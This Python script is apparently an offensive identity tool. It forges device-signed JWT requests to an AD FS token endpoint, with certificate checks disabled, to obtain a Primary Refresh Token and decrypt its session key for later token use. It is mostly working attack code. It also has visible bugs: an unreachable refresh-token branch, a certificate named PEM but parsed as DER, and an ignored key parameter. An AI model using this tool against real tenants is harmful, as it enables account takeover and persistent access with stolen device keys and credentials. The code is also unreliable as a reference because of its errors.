import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.x509 import load_pem_x509_certificate, load_der_x509_certificate
import base64
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
import json
import hashlib
from cryptography.hazmat.primitives.asymmetric import padding as apadding
import warnings
from cryptography.utils import CryptographyDeprecationWarning

warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

# !!! Huge thanks to Dirkjan and ROADTOOLS !!! #

def generate_kid(cert):
    public_key = cert.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return base64.urlsafe_b64encode(hashlib.sha1(public_key).digest()).decode("utf-8").rstrip("=")

def generate_x5c(cert):
    return [base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode("utf-8")]

def request_prt(hostname, client_id, device_cert, device_private_key, transport_key, grant_type, refresh_token="", username="", password=""):
    
    token_url = f"https://{hostname}/adfs/oauth2/token"

    try:
        response = requests.post(token_url, data="grant_type=srv_challenge", verify=False)
        nonce = response.json()["Nonce"]
    except Exception as e:
        print("Failed to get nonce: " + str(e))
        sys.exit(1)
        
    # Generate PRT request
    token = generate_prt_request(client_id, nonce, device_cert, grant_type, refresh_token, username, password)
    print("[*] Generated PRT request: " + token)
    
    try:
        print("[*] Sending PRT request")
        response = requests.post(token_url, data="grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&request=" + token, verify=False)
        
        print("[*] Received PRT response")
        print(response.json())
        
        encrypted_prt = response.json()["refresh_token"]
        jwt = response.json()["session_key_jwe"]
    except Exception as e:
        print("Failed to request PRT: " + str(e))
        sys.exit(1)
    
    # Decrypt the PRT
    session_token = decrypt_session_token(jwt, encrypted_prt, transport_key)
    
    return encrypted_prt, session_token
    
# Taken from Dirkjan's Roadlib library (decrypt_jwe_with_transport_key)
# https://github.com/dirkjanm/ROADtools/blob/96e68445f94982dff5cebf96412939bf9e54956a/roadlib/roadtools/roadlib/deviceauth.py#L719
def decrypt_session_token(encrypted_jwt, encrypted_prt, encryption_key):
    
    parts = encrypted_jwt.split(".")
    body = parts[1]
    body = body + "=" * (4 - len(body) % 4)
    
    encrypted_key = base64.urlsafe_b64decode(body+('='*(len(body)%4)))
    session_token = encryption_key.decrypt(encrypted_key, apadding.OAEP(apadding.MGF1(hashes.SHA1()), hashes.SHA1(), None))
    
    return session_token

def generate_prt_request(client_id, nonce, device_cert, grant_type, refresh_token="", username="", password=""):
    
    header = {
        "alg": "RS256",
        "x5c": generate_x5c(device_cert)
    }
    
    payload = {
        "client_id": client_id,
        "scope": "aza openid",
        "request_nonce": nonce
        }  
    
    if grant_type == "password":
        payload["grant_type"] = "password"
        payload["username"] = username
        payload["password"] = password
    elif grant_type == "refresh_token":
        payload["grant_type"] = "refresh_token"
        payload["refresh_token"] = refresh_token
    
    token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
    
    return token

def print_usage():
    print("Usage: python3 main.py <hostname> <cert.pem> <private_key.pem> <transport_key.pfx> [username] [password]")
    print("Or: python3 main.py <hostname> <cert.pem> <private_key.pem> <transport_key.pfx> [refresh_token]")
    sys.exit(1)

if __name__ == "__main__":
    
    if len(sys.argv) <= 5:
        print_usage()
    
    with open(sys.argv[3], "rb") as key_file:
        private_key = serialization.load_pem_private_key(key_file.read(), password=None)
        
    with open(sys.argv[2], "rb") as cert_file:
        cert = load_der_x509_certificate(cert_file.read())
        
    with open(sys.argv[4], "rb") as transport_key:
        transport_priv_key, transport_cert, _ = pkcs12.load_key_and_certificates(transport_key.read(), b"")
        
    if len(sys.argv) == 5:
        prt, session_key = request_prt(sys.argv[1], "29d9ed98-a469-4536-ade2-f981bc1d605e", cert, private_key, transport_priv_key, "refresh_token", refresh_token=sys.argv[5])
    elif len(sys.argv) == 7:
        prt, session_key = request_prt(sys.argv[1], "29d9ed98-a469-4536-ade2-f981bc1d605e", cert, private_key, transport_priv_key, "password", username=sys.argv[5], password=sys.argv[6])
    else:
        print_usage()
        
    print("[*] Session Token: {}".format(base64.b64encode(session_key).decode("utf-8")))
    print("[*] PRT: {}".format(prt))
    
    print("You can now use `access_token.py` to get an access token using the PRT and the session key.")